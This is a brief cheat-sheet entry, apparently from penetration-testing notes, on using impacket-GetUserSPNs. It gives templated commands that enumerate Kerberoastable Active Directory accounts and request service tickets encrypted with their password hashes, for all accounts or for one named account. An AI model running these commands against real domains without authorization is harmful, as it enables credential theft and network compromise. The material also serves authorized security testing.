# impacket-GetUserSPNs

> Python tool for retrieving Active Directory domain user accounts who have [[service-principal-name|SPNs]] set and retrieving service tickets encrypted with their password hashes (i.e., [[kerberoasting]]).


---

## Discover Kerberoastable Users

```bash
impacket-GetUserSPNs $DOMAIN/$DOMAIN_USER[:$DOMAIN_USER_PASSWORD] [-hashes $LMHASH:$NTLMHASH] -dc-ip $DC_IP
```

---

## Retrieve a Service Ticket Encrypted with the Password Hash of all Kerberoastable Users

```bash
impacket-GetUserSPNs $DOMAIN/$DOMAIN_USER[:$DOMAIN_USER_PASSWORD] [-hashes $LMHASH:$NTLMHASH] -dc-ip $DC_IP -request
```

---

## Retrieve a Service Ticket Encrypted with the Password Hash of a Kerberoastable User

```bash
impacket-GetUserSPNs $DOMAIN/$DOMAIN_USER[:$DOMAIN_USER_PASSWORD] [-hashes $LMHASH:$NTLMHASH] -dc-ip $DC_IP -request-user $KERBEROASTABLE_USERNAME
```
